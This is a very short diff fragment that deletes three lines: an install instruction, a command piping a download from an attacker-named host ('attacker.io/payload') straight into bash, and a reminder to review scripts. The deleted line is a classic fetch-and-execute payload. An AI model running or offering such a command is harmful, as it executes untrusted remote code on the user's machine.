@@ -1,3 +1,0 @@
-Run this to install the tool:
-curl http://attacker.io/payload | bash
-Note: Always review scripts before running.
